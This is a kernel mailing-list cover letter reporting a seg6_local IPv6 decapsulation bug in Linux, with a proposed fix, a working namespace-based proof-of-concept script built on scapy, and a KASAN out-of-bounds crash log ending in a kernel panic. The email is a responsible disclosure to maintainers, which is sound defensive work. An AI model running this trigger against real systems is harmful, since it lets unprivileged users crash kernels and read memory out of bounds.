Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 480E93BED1F
	for <netdev@vger.kernel.org>; Sun, 16 Aug 2026 16:09:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786896589; cv=none; b=VM+EL3GnvHTCTTG5fmbbVuSnhSPJ5+1Ew0Dh5aJTwvn07CTDH2ZZwCNO73RSP9iV345ucuST6lFu/Dv5T/L9g4fbclAhvVCzSNXxXMnSUe9H1LeY2fE+vXtnUWheltYh4HzsABiAOkI+HSFPEQN/LSnadruQk2KDLv1aO0qqkCs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786896589; c=relaxed/simple;
	bh=9vcx8yZxyFubLUI0ByC5NoAFxQkDVnamaaLUfxmJgOY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=BG6i6SI36KjR4GxOwRWwBdSwofXQvILHNUSYmCkkWgEo+ZpNIJhY7WSD2kmJpGCvZIZ3Z29GDSlmXNYqQ7qFP32fiPiINseyl3bU0bi3d9XwODiO0pv5kTBzJeZu+8rtjD8d70NxBlY3yBOZeMUAlJQtDBzxvc5FiLeJH9LnOQ0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=rGxZ4E0E; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="rGxZ4E0E"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-84a4d8fd6ecso2559953b3a.1
        for <netdev@vger.kernel.org>; Sun, 16 Aug 2026 09:09:45 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786896585; x=1787501385; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=wm5wd1RSrCHC9owCXERTpAf1LEWHDpazaMidcieXHsI=;
        b=rGxZ4E0ERbHsiSAyhZVSqaGpC0tzV/dOZ9Z7fjQTB/uA7GpvBYHdWgewCya3Y1IHEO
         p0TLPoNWUKXsvliHjUH8ULiSHdWEn5z0UM9B4sDaVCyOZr4C9X2SEzuG1OQliiQbI++f
         qzcxgyyvz51xYLdVgu8zeLAo8VeTNf7XQoeEsX+rG9b0d2r5qvaP4Lm3amghdKLVc3J5
         5aDxeJDdV1BLqiwPAfCQbazhuCr2LpkxzevKv80mdPNNr7FGrtMrYskHFJHgwpzB0xCH
         kYVc4IGM24HySimc5sbMBOKZdm8WDDojPwY0K5Ho9W1RLR5eAQiinfJJSSDI8q+j4EGM
         zhdw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786896585; x=1787501385;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=wm5wd1RSrCHC9owCXERTpAf1LEWHDpazaMidcieXHsI=;
        b=l6LpuLWTw/cVqgnSdZGPjAm7IARt4aXo9D8YgmCUoxkmhTlklesNlfKx0w1kV1tDPA
         2D630FhLw3NHIYpQViYiapwsf+JBSlSfG1N1ClVZWnOHOBcvONom6a72ualFc0lHzJx5
         InPYIpmoTGQD40FFVDs+wg7cS7ahhsLYrh2FWGp3sFJ0VNtvhv2eHgmDsnXJEnivlrAd
         O/JnyswxFSvhZivpn1pDsoUwdDJ/G2JIi07OLt2cYxawnNHbm+J0VcjVzYsvpxR35E+/
         6eNvoUb6KYV7sbwUuopkXfXE7k3li5+sOED6JlzaggCxmPxFScihYLY7XBswbae+uj5s
         nNFg==
X-Gm-Message-State: AOJu0Yydc+DqpFMbulOcNFinGHlSMseSzdGmkP+vZNYa1sgr5OVVoDGX
	6lxN6zG5bvHZ/stjuEv3KPWY6Pl8+l1cknwxWfljXmh5SHTux7kO0EWpsmQ192aqUt0mjJdJpm3
	CuCNFG5KhoFavBw==
X-Gm-Gg: AR+sD1011SVNw0HKmjdXX/8Dy1+h9D8VXDWNjO/uUOHNWyUOUXhxSgABmXUcbpLgaOi
	X2zwQAtPtrKZG9OpPWVErQqqsfeYW8LMXTdl1Th8llZwEi8yOzTZLpyMpJ3+SJWy3pBHSAlRpPG
	sXgEyKqzNwfABNpkZQd3THkNQRnP2JEtGXDpxWDHJdc46ICeqzOmQs2cHIG7kDKjRoNKh0aP5WO
	UK670Vurukzjh1Zh0OamDpGkm3yKE10p6YM8eA2njRVFCQcNG7kzDYXFosgIbnjZya/T1IS8g1h
	sCF8Gu+EbESj40RrYdtn07klxoeA4HtOO34zRs7LdinByxuG1ZoAIGsFCtCLXZLSHsRYANZEeb/
	JSdJKkeH+D+L12sGlscuotwTM01KZo4zV5TGQjDpCgqtsPyHA3fI6N7Cy3y+hn3E9vdrBYLswjZ
	VSQaRmY9t1mVdHUaRf953cBqZ/MVHDBb/9VOlvfIvWL96UklTPpq2jp5LelAxfg+92xptOTPqX9
	kPoMwBNuyC+wiZ7C5tmusHZXLbN/XiCZN4=
X-Received: by 2002:a05:6a00:4293:b0:84f:3f5e:f072 with SMTP id d2e1a72fcca58-84fde15eb90mr20284478b3a.10.1786896584814;
        Sun, 16 Aug 2026 09:09:44 -0700 (PDT)
Received: from Roxy.localdomain (n220246089185.netvigator.com. [220.246.89.185])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc095a47767sm2410245a12.30.2026.08.16.09.09.38
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 16 Aug 2026 09:09:42 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: andrea.mayer@uniroma2.it,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	david.lebrun@uclouvain.be,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] seg6: reset IP6CB after IPv6 decapsulation
Date: Mon, 17 Aug 2026 00:09:28 +0800
Message-ID: <cover.1786896221.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv6/seg6_local.c. The bug is
reachable by a non-root user via user and net namespace.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

decap_and_validate() locates the inner IPv6 header, pulls the outer
SRv6 envelope, and resets skb->network_header and skb->transport_header.
It leaves IP6CB(skb) unchanged. If the outer packet was locally
delivered through extension-header parsing first, fields such as nhoff,
flags, Router Alert state, and routing-header state still describe the
outer packet.

input_action_end_dt6() and input_action_end_dx6() route the inner IPv6
packet directly to the IPv6 input path. In the PoC, outer Hop-by-Hop
and Destination Options headers leave IP6CB(skb)->nhoff at a large
outer offset before the SRH redirects the skb to an End.DT6 SID. After
decapsulation, ip6_protocol_deliver_rcu() uses that stale nhoff on the
minimal inner IPv6 packet and reads past the skb head allocation.

The fix clears IP6CB(skb) after IPv6 decapsulation, restores the
incoming interface index, and initializes nhoff to the inner IPv6 base
header's nexthdr field before delivering the packet.

Reproducer:

    sh poc.sh

The script re-executes itself in a fresh user and net namespace. We run
the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin

if [ "${POC_INNER:-0}" != "1" ]; then
	exec unshare -Urn env POC_INNER=1 PATH="$PATH" "$0"
fi

ip link add veth0 type veth peer name veth1
ip link set lo up
ip link set veth0 up
ip link set veth1 up

ip -6 addr add 2001:db8:1::1/64 dev veth0
ip -6 addr add 2001:db8:1::2/64 dev veth1
ip -6 addr add 2001:db8:100::1/128 dev lo
ip -6 addr add 2001:db8:200::1/128 dev lo

sysctl -q -w net.ipv6.conf.all.seg6_enabled=1
sysctl -q -w net.ipv6.conf.default.seg6_enabled=1
sysctl -q -w net.ipv6.conf.veth0.seg6_enabled=1
sysctl -q -w net.ipv6.conf.veth1.seg6_enabled=1

ip -6 route add 2001:db8:100::2/128 encap seg6local action End.DT6 table 42 dev veth0
ip -6 route add local 2001:db8:200::1/128 dev lo table 42

python3 - <<'PY'
import re
import subprocess
from scapy.all import (
    Ether,
    HBHOptUnknown,
    IPv6,
    IPv6ExtHdrDestOpt,
    IPv6ExtHdrHopByHop,
    IPv6ExtHdrSegmentRouting,
    conf,
    sendp,
)

conf.verb = 0

link = subprocess.check_output(["ip", "-o", "link", "show", "dev", "veth0"], text=True)
v0mac = re.search(r"link/ether ([0-9a-f:]+)", link).group(1)
opts = [HBHOptUnknown(otype=0x1E + i, optdata=bytes([0x30 + i]) * 250) for i in range(4)]
hbh = IPv6ExtHdrHopByHop(options=opts)
dst = IPv6ExtHdrDestOpt(options=[])
outer = IPv6(src="2001:db8:1::2", dst="2001:db8:100::1", hlim=64)
srh = IPv6ExtHdrSegmentRouting(
    addresses=["2001:db8:100::2", "2001:db8:100::1"],
    segleft=1,
    lastentry=1,
)
inner = IPv6(src="2001:db8:1::2", dst="2001:db8:200::1", hlim=63, nh=59)
pkt = Ether(dst=v0mac) / outer / hbh / dst / srh / inner
sendp(pkt, iface="veth1")
print("packet_sent")
PY

------END poc.sh--------

----BEGIN crash log----

[  509.356948] [  T11021] veth1: entered promiscuous mode
[  509.364211] [      C1] ==================================================================
[  509.364237] [      C1] BUG: KASAN: slab-out-of-bounds in ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.364357] [      C1] Read of size 1 at addr ffff888102715880 by task python3/11021

[  509.364541] [      C1] CPU: 1 UID: 1028 PID: 11021 Comm: python3 Not tainted 6.12.95 #2
[  509.364557] [      C1] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  509.364584] [      C1] Call Trace:
[  509.364596] [      C1]  <IRQ>
[  509.364612] [      C1]  dump_stack_lvl+0x78/0xe0
[  509.364678] [      C1]  print_report+0xc6/0x620
[  509.364737] [      C1]  ? ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.364747] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.364774] [      C1]  ? __virt_addr_valid+0x1f3/0x3d0
[  509.364825] [      C1]  ? ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.364835] [      C1]  kasan_report+0xd8/0x110
[  509.364852] [      C1]  ? ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.364875] [      C1]  ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.364883] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.364890] [      C1]  ? trace_lock_acquire+0x145/0x1c0
[  509.364937] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.364957] [      C1]  ip6_input_finish+0x11b/0x240
[  509.364965] [      C1]  ? ip6_input+0x78/0xb0
[  509.364976] [      C1]  seg6_local_input_core+0xed/0x2e0
[  509.364996] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365008] [      C1]  lwtunnel_input+0x1e9/0x4e0
[  509.365043] [      C1]  ipv6_rthdr_rcv+0x525f/0x6c50
[  509.365064] [      C1]  ? __pfx_lock_release+0x10/0x10
[  509.365072] [      C1]  ? trace_lock_acquire+0x145/0x1c0
[  509.365090] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365109] [      C1]  ? raw6_local_deliver+0x16f/0x8a0
[  509.365136] [      C1]  ? __pfx_ipv6_rthdr_rcv+0x10/0x10
[  509.365155] [      C1]  ? __pfx_raw6_local_deliver+0x10/0x10
[  509.365164] [      C1]  ? ipv6_destopt_rcv+0x3e2/0xc00
[  509.365189] [      C1]  ip6_protocol_deliver_rcu+0xcb7/0x1450
[  509.365199] [      C1]  ? trace_lock_acquire+0x145/0x1c0
[  509.365217] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365232] [      C1]  ? __pfx_ipv6_rcv+0x10/0x10
[  509.365241] [      C1]  ? process_backlog+0x38c/0x1400
[  509.365260] [      C1]  ip6_input_finish+0x11b/0x240
[  509.365268] [      C1]  ? ip6_input+0x78/0xb0
[  509.365278] [      C1]  __netif_receive_skb_one_core+0x11a/0x1b0
[  509.365291] [      C1]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  509.365308] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365315] [      C1]  ? lock_acquire+0x2f/0xb0
[  509.365323] [      C1]  ? process_backlog+0x38c/0x1400
[  509.365340] [      C1]  process_backlog+0x3cc/0x1400
[  509.365356] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365371] [      C1]  __napi_poll.constprop.0+0xa1/0x440
[  509.365387] [      C1]  net_rx_action+0x928/0xe20
[  509.365414] [      C1]  ? __pfx_net_rx_action+0x10/0x10
[  509.365422] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365432] [      C1]  ? sched_ttwu_pending+0x2f3/0x600
[  509.365473] [      C1]  ? __pfx_lock_release+0x10/0x10
[  509.365524] [      C1]  handle_softirqs+0x2ae/0x8b0
[  509.365563] [      C1]  ? __pfx_handle_softirqs+0x10/0x10
[  509.365575] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365582] [      C1]  ? irqtime_account_irq+0x24/0x2e0
[  509.365605] [      C1]  ? __dev_queue_xmit+0x897/0x37e0
[  509.365617] [      C1]  do_softirq+0xb2/0xf0
[  509.365629] [      C1]  </IRQ>
[  509.365634] [      C1]  <TASK>
[  509.365639] [      C1]  __local_bh_enable_ip+0x101/0x120
[  509.365649] [      C1]  ? __dev_queue_xmit+0x897/0x37e0
[  509.365658] [      C1]  __dev_queue_xmit+0x8ac/0x37e0
[  509.365673] [      C1]  ? __might_fault+0xb6/0x120
[  509.365717] [      C1]  ? __pfx___dev_queue_xmit+0x10/0x10
[  509.365737] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365747] [      C1]  ? iov_iter_single_seg_count+0x1f0/0x300
[  509.365797] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365818] [      C1]  ? packet_parse_headers+0x469/0x9b0
[  509.365857] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365864] [      C1]  ? packet_parse_headers+0x469/0x9b0
[  509.365880] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365887] [      C1]  ? __check_object_size+0x2eb/0x4f0
[  509.365912] [      C1]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[  509.365938] [      C1]  ? __pfx_packet_parse_headers+0x10/0x10
[  509.365950] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.365969] [      C1]  ? skb_copy_datagram_from_iter+0xfa/0x6f0
[  509.365993] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.366012] [      C1]  packet_sendmsg+0x2162/0x4d90
[  509.366040] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.366049] [      C1]  ? __pfx_lock_release+0x10/0x10
[  509.366061] [      C1]  ? __pfx___might_resched+0x10/0x10
[  509.366092] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.366116] [      C1]  ? aa_sk_perm+0x1d8/0x8d0
[  509.366160] [      C1]  ? __pfx_packet_sendmsg+0x10/0x10
[  509.366185] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.366192] [      C1]  ? apparmor_socket_sendmsg+0x2e/0x200
[  509.366221] [      C1]  __sys_sendto+0x349/0x3a0
[  509.366240] [      C1]  ? __pfx___sys_sendto+0x10/0x10
[  509.366248] [      C1]  ? reacquire_held_locks+0x20b/0x4c0
[  509.366258] [      C1]  ? do_user_addr_fault+0x854/0xe10
[  509.366293] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.366335] [      C1]  __x64_sys_sendto+0xe0/0x1c0
[  509.366346] [      C1]  ? do_syscall_64+0x93/0x270
[  509.366376] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.366384] [      C1]  ? lockdep_hardirqs_on+0x7b/0x110
[  509.366401] [      C1]  do_syscall_64+0xc7/0x270
[  509.366418] [      C1]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  509.366450] [      C1] RIP: 0033:0x7f58d6971687
[  509.366476] [      C1] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  509.366484] [      C1] RSP: 002b:00007ffeddf41b20 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  509.366511] [      C1] RAX: ffffffffffffffda RBX: 00007f58d68dd780 RCX: 00007f58d6971687
[  509.366518] [      C1] RDX: 0000000000000486 RSI: 0000000003bee930 RDI: 0000000000000003
[  509.366523] [      C1] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  509.366527] [      C1] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  509.366532] [      C1] R13: 0000000000000000 R14: 00000000006ff020 R15: 0000000000a83590
[  509.366562] [      C1]  </TASK>

[  509.366804] [      C1] Allocated by task 11021:
[  509.366824] [      C1]  kasan_save_stack+0x33/0x60
[  509.366846] [      C1]  kasan_save_track+0x14/0x30
[  509.366859] [      C1]  __kasan_kmalloc+0xaa/0xb0
[  509.366873] [      C1]  __kmalloc_node_track_caller_noprof+0x1ef/0x430
[  509.366899] [      C1]  kmalloc_reserve+0xc0/0x240
[  509.366912] [      C1]  __alloc_skb+0x114/0x2e0
[  509.366926] [      C1]  alloc_skb_with_frags+0xc2/0x820
[  509.366941] [      C1]  sock_alloc_send_pskb+0x687/0x820
[  509.366955] [      C1]  packet_sendmsg+0x1b26/0x4d90
[  509.366970] [      C1]  __sys_sendto+0x349/0x3a0
[  509.366984] [      C1]  __x64_sys_sendto+0xe0/0x1c0
[  509.366997] [      C1]  do_syscall_64+0xc7/0x270
[  509.367012] [      C1]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[  509.367043] [      C1] The buggy address belongs to the object at ffff888102715000
                           which belongs to the cache kmalloc-2k of size 2048
[  509.367062] [      C1] The buggy address is located 128 bytes to the right of
                           allocated 2048-byte region [ffff888102715000, ffff888102715800)

[  509.367085] [      C1] The buggy address belongs to the physical page:
[  509.367113] [      C1] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x102710
[  509.367132] [      C1] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  509.367145] [      C1] flags: 0x17ff00000000040(head|node=0|zone=2|lastcpupid=0x7ff)
[  509.367173] [      C1] page_type: f5(slab)
[  509.367291] [      C1] page_owner tracks the page as allocated
[  509.368235] [      C1] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 10248, tgid 10248 (systemd), ts 134558531010, free_ts 134550925179
[  509.371473] [      C1] page last free pid 10248 tgid 10248 stack trace:
[  509.372987] [      C1] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  509.374177] [      C1] CPU: 1 UID: 1028 PID: 11021 Comm: python3 Not tainted 6.12.95 #2
[  509.375391] [      C1] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  509.377281] [      C1] Call Trace:
[  509.377753] [      C1]  <IRQ>
[  509.378185] [      C1]  panic+0x533/0x610
[  509.378759] [      C1]  ? __pfx_panic+0x10/0x10
[  509.379415] [      C1]  ? irqentry_exit+0x3b/0x90
[  509.380079] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.380996] [      C1]  ? ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.381852] [      C1]  ? ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.382705] [      C1]  check_panic_on_warn+0x61/0x80
[  509.383416] [      C1]  end_report+0x11b/0x180
[  509.384041] [      C1]  kasan_report+0xe8/0x110
[  509.384685] [      C1]  ? ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.385540] [      C1]  ip6_protocol_deliver_rcu+0x1118/0x1450
[  509.386338] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.387163] [      C1]  ? trace_lock_acquire+0x145/0x1c0
[  509.387893] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.388683] [      C1]  ip6_input_finish+0x11b/0x240
[  509.389397] [      C1]  ? ip6_input+0x78/0xb0
[  509.390002] [      C1]  seg6_local_input_core+0xed/0x2e0
[  509.390725] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.391512] [      C1]  lwtunnel_input+0x1e9/0x4e0
[  509.392182] [      C1]  ipv6_rthdr_rcv+0x525f/0x6c50
[  509.392913] [      C1]  ? __pfx_lock_release+0x10/0x10
[  509.393628] [      C1]  ? trace_lock_acquire+0x145/0x1c0
[  509.394375] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.395153] [      C1]  ? raw6_local_deliver+0x16f/0x8a0
[  509.396012] [      C1]  ? __pfx_ipv6_rthdr_rcv+0x10/0x10
[  509.396790] [      C1]  ? __pfx_raw6_local_deliver+0x10/0x10
[  509.397608] [      C1]  ? ipv6_destopt_rcv+0x3e2/0xc00
[  509.398416] [      C1]  ip6_protocol_deliver_rcu+0xcb7/0x1450
[  509.399236] [      C1]  ? trace_lock_acquire+0x145/0x1c0
[  509.399955] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.400756] [      C1]  ? __pfx_ipv6_rcv+0x10/0x10
[  509.401424] [      C1]  ? process_backlog+0x38c/0x1400
[  509.402144] [      C1]  ip6_input_finish+0x11b/0x240
[  509.402819] [      C1]  ? ip6_input+0x78/0xb0
[  509.403420] [      C1]  __netif_receive_skb_one_core+0x11a/0x1b0
[  509.404277] [      C1]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  509.405197] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.405966] [      C1]  ? lock_acquire+0x2f/0xb0
[  509.406634] [      C1]  ? process_backlog+0x38c/0x1400
[  509.407383] [      C1]  process_backlog+0x3cc/0x1400
[  509.408121] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.408945] [      C1]  __napi_poll.constprop.0+0xa1/0x440
[  509.409720] [      C1]  net_rx_action+0x928/0xe20
[  509.410397] [      C1]  ? __pfx_net_rx_action+0x10/0x10
[  509.411121] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.411892] [      C1]  ? sched_ttwu_pending+0x2f3/0x600
[  509.412638] [      C1]  ? __pfx_lock_release+0x10/0x10
[  509.413411] [      C1]  handle_softirqs+0x2ae/0x8b0
[  509.414089] [      C1]  ? __pfx_handle_softirqs+0x10/0x10
[  509.414830] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.415620] [      C1]  ? irqtime_account_irq+0x24/0x2e0
[  509.416424] [      C1]  ? __dev_queue_xmit+0x897/0x37e0
[  509.416987] [      C1]  do_softirq+0xb2/0xf0
[  509.417476] [      C1]  </IRQ>
[  509.417793] [      C1]  <TASK>
[  509.418129] [      C1]  __local_bh_enable_ip+0x101/0x120
[  509.418696] [      C1]  ? __dev_queue_xmit+0x897/0x37e0
[  509.419265] [      C1]  __dev_queue_xmit+0x8ac/0x37e0
[  509.419822] [      C1]  ? __might_fault+0xb6/0x120
[  509.420362] [      C1]  ? __pfx___dev_queue_xmit+0x10/0x10
[  509.420943] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.421598] [      C1]  ? iov_iter_single_seg_count+0x1f0/0x300
[  509.422260] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.422881] [      C1]  ? packet_parse_headers+0x469/0x9b0
[  509.423498] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.424118] [      C1]  ? packet_parse_headers+0x469/0x9b0
[  509.424713] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.425355] [      C1]  ? __check_object_size+0x2eb/0x4f0
[  509.425926] [      C1]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[  509.426546] [      C1]  ? __pfx_packet_parse_headers+0x10/0x10
[  509.427186] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.427788] [      C1]  ? skb_copy_datagram_from_iter+0xfa/0x6f0
[  509.428437] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.429052] [      C1]  packet_sendmsg+0x2162/0x4d90
[  509.429591] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.430234] [      C1]  ? __pfx_lock_release+0x10/0x10
[  509.430778] [      C1]  ? __pfx___might_resched+0x10/0x10
[  509.431389] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.431997] [      C1]  ? aa_sk_perm+0x1d8/0x8d0
[  509.432504] [      C1]  ? __pfx_packet_sendmsg+0x10/0x10
[  509.433085] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.433701] [      C1]  ? apparmor_socket_sendmsg+0x2e/0x200
[  509.434306] [      C1]  __sys_sendto+0x349/0x3a0
[  509.434622] [      C1]  ? __pfx___sys_sendto+0x10/0x10
[  509.434949] [      C1]  ? reacquire_held_locks+0x20b/0x4c0
[  509.435305] [      C1]  ? do_user_addr_fault+0x854/0xe10
[  509.435654] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.436027] [      C1]  __x64_sys_sendto+0xe0/0x1c0
[  509.436355] [      C1]  ? do_syscall_64+0x93/0x270
[  509.436652] [      C1]  ? srso_alias_return_thunk+0x5/0xfbef5
[  509.437010] [      C1]  ? lockdep_hardirqs_on+0x7b/0x110
[  509.437354] [      C1]  do_syscall_64+0xc7/0x270
[  509.437647] [      C1]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  509.438184] [      C1] RIP: 0033:0x7f58d6971687
[  509.438660] [      C1] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  509.441205] [      C1] RSP: 002b:00007ffeddf41b20 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  509.442681] [      C1] RAX: ffffffffffffffda RBX: 00007f58d68dd780 RCX: 00007f58d6971687
[  509.444273] [      C1] RDX: 0000000000000486 RSI: 0000000003bee930 RDI: 0000000000000003
[  509.445653] [      C1] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  509.447049] [      C1] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  509.448479] [      C1] R13: 0000000000000000 R14: 00000000006ff020 R15: 0000000000a83590
[  509.449839] [      C1]  </TASK>
[  509.450688] [      C1] Kernel Offset: disabled
[  509.451332] [      C1] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  seg6: reset IP6CB after IPv6 decapsulation

 net/ipv6/seg6_local.c | 5 +++++
 1 file changed, 5 insertions(+)

-- 
2.43.0

